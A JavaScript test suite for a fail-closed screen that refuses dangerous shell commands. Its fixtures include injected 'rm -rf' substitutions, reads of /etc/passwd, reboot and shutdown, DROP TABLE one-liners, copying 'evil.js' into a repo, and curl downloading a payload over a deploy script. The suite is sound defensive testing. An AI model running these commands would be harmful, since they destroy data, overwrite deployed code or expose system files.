#!/usr/bin/env node
// Proof for the fail-closed screen — tooling/grip/screen.mjs.
//
//   node --test tooling/grip/test/screen.test.mjs
//
// WHY THIS SUITE IS SHAPED AROUND THREE NAMED SETS RATHER THAN AROUND THE CODE.
// A denylist authored WITH the full corpus in hand and a measurement harness
// already running still oscillated between false-safe and false-refusal across
// FOUR correction rounds. Every one of those broken drafts would have passed a
// suite that only asserted the behaviours its author was thinking about at the
// time. So the measurement is the deliverable:
//
//   DANGER SET          must be REFUSED   — admitting one is an outage
//   REGRESSION SET      must be ADMITTED  — refusing one punishes honest work
//   NEVER-CRY-WOLF SET  must be ADMITTED  — these LOOK dangerous and are not
//
// All three run after EVERY regex edit, in both error directions at once. Two
// real defects in this module were found that way and by auditing the ADMITTED
// side of the corpus (the side a refusal-focused review never reads):
//   • `bp cloud workspace export … --file default-a.tar` was ADMITTED — it
//     writes a tarball.
//   • `bp task get X -o json` was REFUSED once `-o` was read as an output file;
//     on bp it is the output FORMAT, and that draft cost 13 false refusals.
//
// HERMETIC. Nothing here executes a screened command; the screen is pure.

import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";

import {
  screenCommand, screenSegment, screenAll,
  hostBoundReason, maskQuotedSpans, metacharacterReason, splitSegments, tokenize,
  writeShapeReason, runNamedSets,
  doubleQuoteExpansionReason, envAssignmentReason, screenSedScript,
  ALLOWED_HEADS, REFUSED_HEADS, HOST_BOUND,
  DANGER_SET, REGRESSION_SET, NEVER_CRY_WOLF_SET,
} from "../screen.mjs";

const SCREEN_MJS = fileURLToPath(new URL("../screen.mjs", import.meta.url));
const CORPUS = fileURLToPath(new URL("../fixtures/evidence-corpus.json", import.meta.url));

// ── 1. THE MODULE CONTRACT ───────────────────────────────────────────────────

test("screenCommand returns {ok, reason} with a non-empty reason in both directions", () => {
  const admitted = screenCommand("git worktree list");
  const refused = screenCommand("reboot");
  for (const r of [admitted, refused]) {
    assert.equal(typeof r.ok, "boolean");
    assert.equal(typeof r.reason, "string");
    assert.ok(r.reason.length > 0, "a verdict with no reason is not a verdict");
  }
  assert.equal(admitted.ok, true);
  assert.equal(refused.ok, false);
});

test("screen.mjs imports NOTHING from rerun.mjs (D29: a denylist verdict must never be read as an allowlist verdict)", () => {
  const src = readFileSync(SCREEN_MJS, "utf8");
  const imports = [...src.matchAll(/^\s*import\s[^;]*?from\s+["']([^"']+)["']/gm)].map((m) => m[1]);
  assert.deepEqual(imports, [], `screen.mjs must be self-contained; found imports: ${imports.join(", ")}`);
  assert.ok(!/from\s+["'][^"']*rerun\.mjs/.test(src), "screen.mjs must not import rerun.mjs");
  // The two dynamic imports it does have are node: builtins, in the CLI only.
  const dynamic = [...src.matchAll(/await import\(["']([^"']+)["']\)/g)].map((m) => m[1]);
  assert.ok(dynamic.every((d) => d.startsWith("node:")), `dynamic imports must be node: builtins, got ${dynamic.join(", ")}`);
});

test("FAILS CLOSED: an unknown command head is REFUSED", () => {
  const r = screenCommand("some-novel-binary --do-a-thing");
  assert.equal(r.ok, false);
  assert.match(r.reason, /unknown command head "some-novel-binary"/);
  assert.match(r.reason, /fails CLOSED/i);
});

test("FAILS CLOSED: heads inherited from Object.prototype are not entries", () => {
  // Wave 2's review found the ten-verdict vocabulary leaking through
  // Object.prototype: a bare index on an object literal resolved `toString` and
  // `constructor` as if they were members, so the guard written to keep a set
  // closed was the one place it failed open. ALLOWED_HEADS is a Map.
  for (const head of ["toString", "constructor", "__proto__", "hasOwnProperty", "valueOf"]) {
    const r = screenCommand(`${head} --x`);
    assert.equal(r.ok, false, `${head} must not resolve as an allowlisted head`);
    assert.match(r.reason, /unknown command head|not allowlisted/);
  }
  assert.ok(ALLOWED_HEADS instanceof Map);
  assert.ok(REFUSED_HEADS instanceof Map);
});

test("empty, whitespace and unparsable commands are REFUSED, never admitted by default", () => {
  for (const c of ["", "   ", null, undefined]) {
    assert.equal(screenCommand(c).ok, false, `${JSON.stringify(c)} must be refused`);
  }
  const unterminated = screenCommand("grep -n 'unterminated file.txt");
  assert.equal(unterminated.ok, false);
  assert.match(unterminated.reason, /unterminated quote/);
});

// ── 2. LAYER (a) — THE HOST BOUND, AND ITS ORDER ─────────────────────────────

test("the host bound refuses every named host, verb and IP", () => {
  const cases = [
    ["ssh guerrilla 'systemctl status barkpark'", /ssh/],
    ["scp deploy.sh guerrilla:/opt/barkpark/", /scp|guerrilla/],
    ["rsync -av ./dist/ prod:/srv/", /rsync/],
    ["curl http://157.180.90.121/api/health", /157\.180\.90\.121/],
    ["curl http://178.105.92.191/api/health", /178\.105\.92\.191/],
    ["curl https://guerrilla.barkpark.cloud/v1/data", /guerrilla|barkpark\.cloud/],
    ["curl https://api.barkpark.cloud/v1/data", /barkpark\.cloud/],
    ["cat /home/root@host/notes", /root@/],
  ];
  for (const [cmd, why] of cases) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `must refuse: ${cmd}`);
    assert.match(r.reason, /^host bound:/, `must refuse at the HOST layer: ${cmd} → ${r.reason}`);
    assert.match(r.reason, why);
  }
  assert.equal(HOST_BOUND.length, 8, "eight host-bound patterns are ratified");
});

test("the host bound is checked BEFORE the allowlist — it beats an unknown head to the verdict", () => {
  // `some-novel-binary` alone is refused as an unknown head. Named with a prod
  // host it must be refused as a HOST violation, which is only possible if the
  // host layer runs first. That ordering is what protects the concurrent PDS
  // crown cycle measuring against the deployed build.
  assert.match(screenCommand("some-novel-binary --do-a-thing").reason, /unknown command head/);
  assert.match(screenCommand("some-novel-binary --host root@guerrilla").reason, /^host bound:/);
  // And it beats an otherwise perfectly ADMISSIBLE command.
  assert.equal(screenCommand("grep -rn 'x' notes.md").ok, true);
  assert.match(screenCommand("grep -rn 'x' guerrilla-notes.md").reason, /^host bound:/);
});

// WAVE 5 REVERSED THIS TEST, AND THE REVERSAL IS THE FINDING.
//
// It used to assert that a hostname inside quotes is still refused, priced as
// "a handful of admissible reads" for a layer that "gets no cleverness". Wave 5
// measured the bill instead of estimating it: the wave reads ops docs, and the
// most quotable line in every one of them contains `ssh`, so
// `grep -c "ssh" docs/ops/PROD_OPS.md` was refused as REMOTE EXECUTION. A
// pattern was being read as a target, and a screen that refuses the honest reads
// its own operators need gets ROUTED AROUND rather than tightened (charter D63).
//
// The host bound now runs on the MASKED string. What makes that sound is the
// ordering, not optimism: `doubleQuoteExpansionReason` refuses any double-quoted
// span sh would expand BEFORE anything trusts a blanked span, so a masked span
// provably cannot become a command. `hostBoundReason` itself is unchanged — only
// what it is handed.
test("the host bound scans the MASKED string — a quoted hostname is DATA, an unquoted one is SYNTAX", () => {
  assert.equal(screenCommand(`grep -n "guerrilla" README.md`).ok, true, "a grep PATTERN is not a target");
  assert.equal(screenCommand(`grep -n 'ssh' docs/ops/PROD_OPS.md`).ok, true);

  // The direction that matters is untouched: a host that appears as SYNTAX is
  // still refused, and still beats every other layer to the verdict.
  for (const cmd of ["ssh root@157.180.90.121 uptime", "scp x root@host:/tmp/x", "curl -s https://guerrilla.barkpark.cloud/api/schemas"]) {
    assert.match(screenCommand(cmd).reason, /^host bound:/, `MUST REFUSE as a host violation: ${cmd}`);
  }

  // `hostBoundReason` is unchanged — it is the INPUT that moved one step later.
  assert.equal(hostBoundReason(`echo "ssh is mentioned here"`), "names ssh (remote execution)");
  assert.equal(hostBoundReason(maskQuotedSpans(`echo "ssh is mentioned here"`)), null);
});

// ── 3. LAYER (b) — METACHARACTERS AND THE ALLOWLIST ──────────────────────────

test("shell metacharacters that turn one command into another are REFUSED", () => {
  const cases = [
    ["grep -rn x . $(rm -rf /tmp/y)", /command substitution/],
    ["grep -rn x `rm -rf /tmp/y`", /backticks/],
    ["diff <(cat a) <(cat b)", /process substitution/],
    ["grep x a.txt ; reboot", /command sequencing/],
    ["grep x a.txt > /tmp/out.txt", /output redirection/],
    ["grep x a.txt >> /tmp/out.txt", /output redirection/],
    ["cat < /etc/passwd", /input redirection/],
    ["( cd /tmp && reboot )", /subshell/],
    ["mix test &", /background job/],
    ["grep x a.txt\nreboot", /newline/],
  ];
  for (const [cmd, why] of cases) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `must refuse: ${cmd}`);
    assert.match(r.reason, why, `${cmd} → ${r.reason}`);
  }
});

test("the two DISCARDING redirections are admitted; every other redirection is not", () => {
  assert.equal(screenCommand("grep -c x a.txt 2>/dev/null").ok, true);
  assert.equal(screenCommand("mix test 2>&1").ok, true);
  assert.equal(screenCommand("go vet ./... >/dev/null 2>&1").ok, true);
  assert.equal(screenCommand("go vet ./... > vet.log").ok, false);
});

test("a metacharacter INSIDE quotes is data, not syntax — the honest-work case", () => {
  // rerun.mjs was refusing exactly these before it gained quote awareness, and a
  // gate that punishes honest work gets routed around within a wave (D3).
  for (const c of [
    `grep -n "a > b" README.md`,
    `grep -rn "npm publish instructions" docs/`,
    `git log --grep="publish flow"`,
    `grep -n "chmod 644 is required" docs/x.md`,
    `grep -c '^+def build(' api/lib/barkpark/content/errors.ex`,
  ]) {
    const r = screenCommand(c);
    assert.equal(r.ok, true, `must stay admitted: ${c} → ${r.reason}`);
  }
});

test("a pipeline is only as admissible as its LEAST admissible member", () => {
  assert.equal(screenCommand("git log --oneline | head -5").ok, true);
  assert.equal(screenCommand("cd /repo && grep -rn x .").ok, true);
  const r = screenCommand("git log --oneline | tee /tmp/log.txt");
  assert.equal(r.ok, false);
  assert.match(r.reason, /tee|pipeline segment/);
  const r2 = screenCommand("cd /repo && bash deploy/site-deploy.sh");
  assert.equal(r2.ok, false);
  assert.match(r2.reason, /bash/);
});

test("an environment-assignment prefix is stripped so the real head is screened", () => {
  // Without stripping, `MIX_ENV=test mix ecto.drop` presents `MIX_ENV=test` as
  // its head and never reaches the mix rule at all.
  assert.equal(screenCommand("MIX_ENV=test mix test").ok, true);
  assert.equal(screenCommand("CC=clang MIX_ENV=test mix test test/foo_test.exs").ok, true);
  const r = screenCommand("MIX_ENV=test mix ecto.drop");
  assert.equal(r.ok, false);
  assert.match(r.reason, /ecto\.drop/);
  assert.equal(screenCommand("FOO=bar").ok, false);
});

test("sub-verb rules refuse the mutating half of an allowlisted head", () => {
  const refused = [
    ["git fetch origin", /git fetch mutates \.git refs/],
    ["git pull --rebase", /not on the read-only allowlist/],
    ["git checkout main", /not on the read-only allowlist/],
    ["git worktree add ../wt branch", /git worktree may only be used as/],
    ["git stash pop", /git stash may only be used as/],
    ["git config user.name Bob", /git config may only be used with/],
    ["mix ecto.migrate", /mix task "ecto\.migrate"/],
    ["mix deps.get", /mix task "deps\.get"/],
    ["go build -o /tmp/bin ./cmd", /go -o|read-only allowlist/],
    ["docker rm -f container", /docker sub-verb "rm"/],
    ["docker run -it ubuntu bash", /docker sub-verb "run"/],
    ["systemctl daemon-reload", /systemctl sub-verb "daemon-reload"/],
    ["npm install", /npm sub-verb "install"/],
    ["bp task close t1 worker 1 done", /bp write verb "close"/],
    ["bp doc publish task foo --yes", /bp write verb "publish"/],
    ["bp cloud workspace export default --file default-a.tar", /bp write verb "export"|--file writes a file/],
    ["bp -s https://guerrilla.example/api task ls", /host bound|non-loopback/],
    // Either message is correct. The noun allowlist added in review fires
    // FIRST (`gh pr sub-verb "create" is not read-only`); the GH_WRITE_VERBS
    // denylist behind it still catches a write verb on an allowlisted noun.
    ["gh pr create --title x", /gh pr sub-verb "create" is not read-only|gh write verb "create"/],
    ["gh api repos/o/r/issues -X POST", /write method/],
    ["kill -9 4242", /liveness probe/],
    ["kill -TERM 4242", /liveness probe/],
    ["curl -X POST https://example.com/x", /write method/],
    ["curl -d 'a=1' https://example.com/x", /request body/],
    ["curl -s https://example.com/p.sh -o /opt/barkpark/deploy/site-deploy.sh", /curl -o writes a file/],
    ["find . -name '*.tmp' -delete", /find -delete/],
    ["find . -name '*.go' -exec rm {} ;", /find -exec|command sequencing/],
    ["env FOO=bar reboot", /env with arguments/],
  ];
  for (const [cmd, why] of refused) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `must refuse: ${cmd}`);
    assert.match(r.reason, why, `${cmd} → ${r.reason}`);
  }
});

test("every interpreter head is REFUSED, which is what makes quote-masking safe here", () => {
  // rerun.mjs's quote-awareness fix opened four live bypasses (`su -c`, `watch`,
  // `elixir -e`, `iex -e`) because blanking a quoted span turns an inline
  // PROGRAM into invisible data. That class cannot reach this module: no head
  // that executes a string is on the allowlist at all.
  for (const c of [
    "sh -c 'rm -rf /tmp/y'", "bash -c 'reboot'", "zsh -c 'ls'",
    "node -e 'require(\"fs\").rmSync(\"/tmp/y\")'", "python3 -c 'import os; os.remove(\"/tmp/y\")'",
    "perl -e 'unlink 1'", "ruby -e 'x'", "awk '{system(\"reboot\")}' f",
    "elixir -e 'File.rm!(\"x\")'", "iex -e 'x'", "psql -c 'DROP TABLE docs'",
    "su -c 'reboot'", "sudo reboot", "watch systemctl restart barkpark",
    "timeout 5 reboot", "nohup reboot", "setsid reboot", "xargs -I{} rm {}",
    "eval 'reboot'", "make deploy", "npx some-package",
  ]) {
    const r = screenCommand(c);
    assert.equal(r.ok, false, `must refuse interpreter/wrapper: ${c} → ${r.reason}`);
  }
  for (const head of ["sh", "bash", "node", "python3", "perl", "ruby", "awk", "xargs", "eval", "npx", "psql", "su", "sudo", "watch", "timeout"]) {
    assert.equal(ALLOWED_HEADS.has(head), false, `${head} must NOT be allowlisted`);
  }
  // `sed` LEFT this list in wave 5 and is now allowlisted — the one head on it
  // that was judged by reputation rather than by capability. It is the ONLY
  // exception, and it is not one: sed cannot execute a string at all except
  // through the `e` command and the `s///e` flag, and BOTH are refused by
  // `screenSedScript`, along with `-i`, `w` and `s///w`. The claim this suite
  // makes about the others — "no head that executes a string is on the
  // allowlist" — therefore still holds verbatim.
  assert.equal(ALLOWED_HEADS.has("sed"), true, "sed is judged on its SCRIPT (see the wave-5 block)");
  for (const c of ["sed '1e reboot' f", "sed 's/x/y/e' f", "sed -i 's/x/y/' f", "sed -f /tmp/evil.sed f"]) {
    assert.equal(screenCommand(c).ok, false, `sed's executing/writing forms must still refuse: ${c}`);
  }
});

test("the two settled rulings hold: git fetch and npx are REFUSED", () => {
  assert.equal(screenCommand("git fetch origin").ok, false);
  assert.equal(screenCommand("git fetch --all --prune").ok, false);
  assert.match(screenCommand("git fetch origin").reason, /\.git refs in a checkout three live cycles share/);
  assert.equal(screenCommand("npx playwright test").ok, false);
  assert.match(screenCommand("npx playwright test").reason, /installs and then executes an arbitrary package/);
});

// ── 4. LAYER (c) — WRITE SHAPES AS SECOND-LAYER DEFENCE ──────────────────────

test("layer (c) catches cp — the verb rerun.mjs’s WRITE_SHAPES omits entirely", async () => {
  // rerun.mjs's filesystem rule is `(mkdir|touch|chmod|chown|ln)`. `cp` appears
  // NOWHERE in that module, and `cp` is the one verb that overwrites an
  // existing file with different content.
  const why = writeShapeReason("cp /tmp/evil.js api/lib/barkpark/application.ex");
  assert.ok(why, "cp must be a write shape");
  assert.match(why, /^cp \(overwrites a file/);
  // Proven BEHAVIOURALLY against the real rerun.mjs, not by reading its source
  // for the word "cp" — a first draft of this control did that and matched
  // `File.(…|cp|cp_r|…)`, an Elixir API that does not fire on a shell `cp`, so
  // the control asserted the opposite of its own claim. The test file may
  // import rerun.mjs; only screen.mjs may not.
  const { classifySafety } = await import("../rerun.mjs");
  const CP_INTO_REPO = "cp /tmp/evil.js api/lib/barkpark/application.ex";
  assert.equal(
    classifySafety(CP_INTO_REPO).safe, true,
    "the gap this slice was filed on: rerun.mjs rates a repo-overwriting cp SAFE. If this ever fails, rerun.mjs has been fixed and this comment must be updated.",
  );
  assert.equal(screenCommand(CP_INTO_REPO).ok, false, "the screen refuses what classifySafety admits");
});

test("layer (c) is tested DIRECTLY, so 'unreachable' never quietly becomes 'untested'", () => {
  // In a correct screen these never fire — layer (b) refuses their heads first.
  // The layer exists to catch a MISTAKE in the allowlist, so it is proven here
  // on its own rather than through screenCommand.
  const cases = [
    ["cp a b", /^cp/],
    ["rm -rf /tmp/y", /destructive filesystem verb/],
    ["mv a b", /destructive filesystem verb/],
    ["mkdir -p /tmp/x", /filesystem mutation/],
    ["cat x | tee /tmp/y", /tee/],
    ["sed -i '' s/a/b/ f", /sed -i/],
    ["git push origin main", /git write verb/],
    ["git fetch origin", /git write verb/],
    ["mix ecto.drop", /mix write task/],
    ["npm install", /package mutation/],
    ["systemctl stop barkpark.service", /systemctl mutating verb/],
    ["reboot", /machine power state/],
    ["shutdown -h now", /machine power state/],
    ["kill -9 4242", /terminating signal/],
    ["pkill -f barkpark", /signal by pattern/],
    ["curl -X POST https://x/y", /curl write method/],
    ["curl https://x/p.sh -o /opt/deploy.sh", /curl -o writes a file/],
    ["bp task close t1 w 1", /bp write verb/],
    ["psql -c 'DROP TABLE docs'", /SQL write/],
    ["prettier --write .", /--write/],
  ];
  for (const [cmd, why] of cases) {
    const got = writeShapeReason(cmd);
    assert.ok(got, `layer (c) must catch: ${cmd}`);
    assert.match(got, why, `${cmd} → ${got}`);
  }
  // And it must NOT fire on the honest reads.
  for (const c of ["git worktree list", "kill -0 4242", "curl -s -o /dev/null -w %{http_code} https://x/", "docker ps", "mix test test/foo_test.exs"]) {
    assert.equal(writeShapeReason(c), null, `layer (c) must not fire on: ${c}`);
  }
});

// ── 5. THE THREE NAMED SETS — THE MEASUREMENT IS THE DELIVERABLE ─────────────

test("DANGER SET: every command is REFUSED, with its reason", () => {
  const lines = [];
  const admitted = [];
  for (const cmd of DANGER_SET) {
    const r = screenCommand(cmd);
    lines.push(`  ${r.ok ? "ADMITTED !!" : "refused    "}  ${cmd}\n              → ${r.reason}`);
    if (r.ok) admitted.push(cmd);
  }
  console.log(`DANGER SET (${DANGER_SET.length}) — every one must be REFUSED:\n${lines.join("\n")}`);
  assert.deepEqual(admitted, [], "a DANGER SET command was admitted — that is an outage, not a test failure");
});

test("DANGER SET covers the shapes classifySafety rated SAFE", () => {
  // These are the named shapes whose admission is an outage or a corrupted
  // checkout. The SIZE of the gap is not asserted here as a remembered number —
  // see "the size of the gap is RE-DERIVED, never remembered" below, which
  // recomputes it against the real classifySafety on every run.
  const required = [
    /site-deploy\.sh/, /systemctl stop/, /systemctl restart/, /ecto\.drop/,
    /^cp /, /^reboot$/, /shutdown/, /curl .* -o /, /claude -p/, /kill -9/,
    /pkill/, /git fetch/, /npx/, /some-novel-binary/,
    // wave 4 — the arbitrary file-overwrite primitive
    /^sort .*-o /, /^uniq \S+ \S+/, /^tree -o /, /^npm pack$/,
  ];
  for (const re of required) {
    assert.ok(DANGER_SET.some((c) => re.test(c)), `DANGER SET must carry a ${re} shape`);
  }
  assert.ok(DANGER_SET.filter((c) => /site-deploy\.sh/.test(c)).length >= 2, "both site-deploy.sh invocations");
});

test("REGRESSION SET: every command stays ADMITTED — 0 over-refusals", () => {
  const refused = [];
  for (const cmd of REGRESSION_SET) {
    const r = screenCommand(cmd);
    console.log(`  ${r.ok ? "admitted" : "REFUSED!"}  ${cmd}`);
    if (!r.ok) refused.push(`${cmd} → ${r.reason}`);
  }
  assert.deepEqual(refused, [], "a gate that punishes honest work gets routed around within a wave (D3)");
  // Named individually so a failure names the behaviour, not an index.
  assert.equal(screenCommand("grep -n 'template' deploy/site-deploy.sh").ok, true, "READING a deploy script is not RUNNING it");
  assert.equal(screenCommand("mix test test/barkpark/sites/deploy_runner_test.exs:583").ok, true, "a targeted mix test");
  assert.equal(screenCommand("git worktree list").ok, true, "git worktree LIST");
  assert.equal(screenCommand("command -v setsid").ok, true, "command -v of a refused head is still just a lookup");
});

test("NEVER-CRY-WOLF SET: the dangerous-LOOKING commands stay ADMITTED", () => {
  const refused = [];
  for (const cmd of NEVER_CRY_WOLF_SET) {
    const r = screenCommand(cmd);
    console.log(`  ${r.ok ? "admitted" : "REFUSED!"}  ${cmd}`);
    if (!r.ok) refused.push(`${cmd} → ${r.reason}`);
  }
  assert.deepEqual(refused, []);
  assert.equal(screenCommand("kill -0 4242").ok, true, "kill -0 signals nothing — it probes liveness");
  assert.equal(screenCommand("curl -s -o /dev/null -w %{http_code} https://x/").ok, true, "-o /dev/null discards, it does not write");
  assert.equal(screenCommand("systemctl is-active barkpark.service").ok, true, "is-active reads");
  assert.equal(screenCommand("docker ps").ok, true, "docker ps reads");
});

test("CONTROL (D18): the three sets can FAIL — an admit-everything screen fails all of them", () => {
  // A set that cannot fail proves nothing. Both directions are exercised: a
  // permissive screen must produce false PERMISSIONS, a paranoid one false
  // REFUSALS. Without this, a suite of green assertions over a broken screen
  // reads exactly like a suite of green assertions over a correct one.
  const admitAll = () => ({ ok: true, reason: "stub" });
  const refuseAll = () => ({ ok: false, reason: "stub" });

  const permissive = runNamedSets(admitAll);
  assert.equal(permissive.falsePermissions.length, DANGER_SET.length, "the DANGER SET must catch a fully permissive screen");
  assert.equal(permissive.falseRefusals.length, 0);

  const paranoid = runNamedSets(refuseAll);
  assert.equal(paranoid.falsePermissions.length, 0);
  assert.equal(paranoid.falseRefusals.length, REGRESSION_SET.length + NEVER_CRY_WOLF_SET.length, "the admit sets must catch a fully paranoid screen");

  const real = runNamedSets();
  assert.deepEqual(real.falsePermissions, []);
  assert.deepEqual(real.falseRefusals, []);
});

// ── 6. THE CENSUS'S HONEST REACH ─────────────────────────────────────────────

test("the admission rate over the frozen corpus is MEASURED and PRINTED", () => {
  const corpus = JSON.parse(readFileSync(CORPUS, "utf8"));
  const commands = corpus.proofs.map((p) => p?.command).filter((c) => typeof c === "string" && c.trim());
  const r = screenAll(commands);

  assert.equal(r.total, 651, "the frozen corpus carries 651 distinct proof commands");
  console.log(
    `\nCENSUS REACH — ${r.admitted}/${r.total} admitted = ${(r.rate * 100).toFixed(1)}% ` +
      `(${r.refused} refused)\n` +
      `  This is the census's honest reach over THESE 651 commands. A statistic later\n` +
      `  derived over the ${r.admitted} admitted commands describes that subset only — it may\n` +
      `  NEVER be restated as covering 651 commands.\n` +
      `  top refusal reasons:\n` +
      [...r.byReason].sort((a, b) => b[1] - a[1]).slice(0, 8).map(([w, n]) => `    ${String(n).padStart(4)}  ${w}`).join("\n"),
  );

  // A bound, not a frozen number: the rate is a property of the screen AND the
  // corpus, and pinning it exactly would make every honest allowlist widening
  // look like a regression. But a rate near 0 means the screen is useless and a
  // rate near 1 means it is not screening.
  assert.ok(r.rate > 0.15, `admission rate ${(r.rate * 100).toFixed(1)}% is so low the census cannot re-derive anything`);
  assert.ok(r.rate < 0.6, `admission rate ${(r.rate * 100).toFixed(1)}% is too high for a fail-closed screen over untrusted input`);
});

test("no corpus command is admitted while naming a bounded host AS SYNTAX — the layer (a) sweep", () => {
  // The sweep now runs over the MASKED command, matching the layer it audits.
  // Sweeping the RAW string would re-assert the very over-refusal wave 5
  // removed, and it caught exactly one row when the fix landed:
  //
  //   gh run view 29112942807 --log | grep -iE 'healthy|guerrilla|157\.180|89\.167'
  //
  // — a `gh run view` piped into a grep whose PATTERN happens to name a host and
  // two prod IPs. Nothing in it reaches any machine; the hostnames are the thing
  // being searched FOR. That row is the +1 half of this wave's widening, and a
  // raw sweep would call the fix a leak.
  const corpus = JSON.parse(readFileSync(CORPUS, "utf8"));
  const leaked = corpus.proofs
    .map((p) => p?.command)
    .filter((c) => typeof c === "string" && screenCommand(c).ok)
    .filter((c) => {
      const masked = maskQuotedSpans(c);
      return masked !== null && HOST_BOUND.some(([re]) => re.test(masked));
    });
  assert.deepEqual(leaked, [], "a command naming a bounded host OUTSIDE quotes was admitted");

  // The complement, asserted rather than assumed: every corpus row that names a
  // host outside quotes is still refused.
  const rawNamers = corpus.proofs
    .map((p) => p?.command)
    .filter((c) => typeof c === "string" && HOST_BOUND.some(([re]) => re.test(c)));
  assert.ok(rawNamers.length > 0, "the corpus must contain host-naming rows for this sweep to mean anything");
});

test("screenAll dedupes and never crashes on a hostile row", () => {
  const r = screenAll(["git status", "git status", null, undefined, 42, "", "   ", "reboot"]);
  assert.equal(r.total, 2, "duplicates and non-strings are dropped before screening");
  assert.equal(r.admitted, 1);
  assert.equal(r.refused, 1);
});

// ── 7. THE PARSER PRIMITIVES ─────────────────────────────────────────────────

test("maskQuotedSpans preserves offsets and returns null on an unterminated quote", () => {
  const cmd = `grep -n "a > b" f.md`;
  const masked = maskQuotedSpans(cmd);
  assert.equal(masked.length, cmd.length, "masking must be 1:1 so offsets still line up");
  assert.equal(masked.includes(">"), false, "the quoted redirect must be masked");
  assert.ok(masked.startsWith("grep -n "), "unquoted text must stay byte-identical");
  assert.equal(maskQuotedSpans(`grep -n "unterminated`), null);
  assert.equal(maskQuotedSpans(`grep -n 'unterminated`), null);
});

test("tokenize strips quotes and keeps a quoted span as ONE token", () => {
  assert.deepEqual(tokenize(`grep -n "a b" f.md`), ["grep", "-n", "a b", "f.md"]);
  assert.deepEqual(tokenize(`bp task get x -o json`), ["bp", "task", "get", "x", "-o", "json"]);
  assert.deepEqual(tokenize(""), []);
});

test("splitSegments splits on UNQUOTED separators only", () => {
  const raw = `git log | grep "a|b" && head -1`;
  assert.deepEqual(splitSegments(raw, maskQuotedSpans(raw)), ["git log", `grep "a|b"`, "head -1"]);
  const fd = `mix test 2>&1 | tail -5`;
  assert.deepEqual(splitSegments(fd, maskQuotedSpans(fd)), ["mix test 2>&1", "tail -5"]);
});

test("metacharacterReason and screenSegment are usable on their own", () => {
  assert.equal(metacharacterReason("grep x f"), null);
  assert.match(metacharacterReason("grep x f ; reboot"), /sequencing/);
  assert.equal(screenSegment("git worktree list"), null);
  assert.match(screenSegment("reboot"), /not allowlisted/);
});

// ── 8. THE SECOND-EXECUTION-PATH QUESTION (brief: harvest.mjs, 606 lines) ────

test("harvest.mjs holds ONE execution path and it runs a MODULE CONSTANT, not corpus input", () => {
  // Read in full for this slice. harvest.mjs DOES execute a child process —
  // `execFileSync("bash", ["-c", LIST_COMMAND])` at :78 — which a grep for
  // `spawnSync` misses entirely. But the string it runs is the module-level
  // LIST_COMMAND constant (:59-61), never a value from the corpus, a fact or a
  // caller. So it is NOT a second path for historical commands and does not
  // need this screen. This test pins that reading so the finding cannot rot.
  const src = readFileSync(fileURLToPath(new URL("../harvest.mjs", import.meta.url)), "utf8");
  const execs = [...src.matchAll(/\b(execFileSync|execSync|spawnSync|spawn|exec|fork)\s*\(/g)].map((m) => m[1]);
  assert.deepEqual(execs, ["execFileSync"], `harvest.mjs's execution surface changed: ${execs.join(", ")} — re-audit whether it now runs untrusted input`);
  assert.match(src, /execFileSync\("bash", \["-c", LIST_COMMAND\]/, "the one exec must still run the LIST_COMMAND constant");
  assert.match(src, /const LIST_COMMAND =\s*\n?\s*"find /, "LIST_COMMAND must remain a module-level literal");
});

// ── 9. FLAG-SPELLING BYPASSES (added in review) ──────────────────────────────
//
// Seven commands were ADMITTED by the first shipped draft. They share one root
// cause: the rules compared flag TOKENS exactly, while a shell accepts several
// spellings of the same flag. The sharpest is D29's own named danger with its
// short flags CLUSTERED — `-so <path>` rather than `-o <path>` — which walked
// past layer (b) AND layer (c), whose pattern also demanded a bare ` -o `.
//
// The lesson is about the instrument, not the regex: the DANGER SET carried the
// unclustered spelling only, so the measurement built to catch exactly this
// class could not see it. A named set measures the spellings it contains and
// nothing else. All seven now live in DANGER_SET, so the selftest carries them.

test("a flag spelled differently is the same flag — clustered, =-joined and long forms all refuse", () => {
  const bypasses = [
    ["curl -s https://example.com/payload.sh -so /opt/barkpark/deploy/site-deploy.sh", /curl -o writes a file/],
    ["curl -sO https://example.com/payload.sh", /writes a file/],
    ["curl -sJO https://example.com/x", /writes a file/],
    ["curl --output=/tmp/x https://example.com/x", /curl -o writes a file/],
    ["curl --request=POST https://example.com/x", /write method/],
    ["bp --server=https://example.com task ls", /non-loopback/],
    ["bp doc ls --output=/tmp/x", /writes a file/],
    ["gh repo clone barkpark/barkpark /tmp/x", /not read-only|write verb/],
    ["gh release download v1 --dir /tmp", /not read-only|write verb/],
    ["gh gist create x", /not on the read-only allowlist/],
    ["journalctl --vacuum-size=1M", /mutates or deletes the journal/],
    ["journalctl --rotate", /mutates or deletes the journal/],
    ["date -s 2020-01-01", /SETS the system clock/],
    ["date --set=2020-01-01", /SETS the system clock/],
  ];
  for (const [cmd, why] of bypasses) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `MUST REFUSE: ${cmd}`);
    assert.match(r.reason, why, `wrong reason for ${cmd}: ${r.reason}`);
  }
});

test("the cluster expander does not turn honest curl reads into false refusals", () => {
  // The cost of the fix, measured in the direction that punishes honest work.
  // `-s`, `-sS`, `-sL`, `-so /dev/null` and a `-w` format string clustered
  // behind `-s` are the corpus's ordinary read shapes.
  const honest = [
    "curl -s https://example.com/health",
    "curl -sS https://example.com/health",
    "curl -sL https://example.com/health",
    "curl -so /dev/null -w %{http_code} https://example.com/",
    "curl -s -o /dev/null -w %{http_code} https://example.com/",
    "gh api repos/o/r/branches/main/protection",
    "gh pr view 4159 --json state,mergedAt",
    "gh run list --workflow elixir.yml --limit 5",
    "journalctl -u barkpark --since '1 hour ago'",
    "date -u +%Y-%m-%dT%H:%M:%SZ",
  ];
  for (const cmd of honest) {
    assert.equal(screenCommand(cmd).ok, true, `MUST ADMIT: ${cmd} — ${screenCommand(cmd).reason}`);
  }
});

// THE REACH IS RE-MEASURED, NOT RE-FROZEN.
//
// Waves 2-4 asserted "the fixes cost the census no reach: 240, before and
// after" — a fair claim while every fix was a TIGHTENING of a shape the corpus
// did not contain. Wave 5 ships tightenings AND widenings together on purpose
// (charter D63: a screen that only ever tightens gets routed around), so the
// number MUST move, and a test that demands it not move would be a test that
// forbids the wave.
//
// So the pin stays — a silent change to this module's own reach is still the
// finding — but it is stated as a DELTA with its membership accounted for,
// which is what makes it a measurement rather than a magic number.
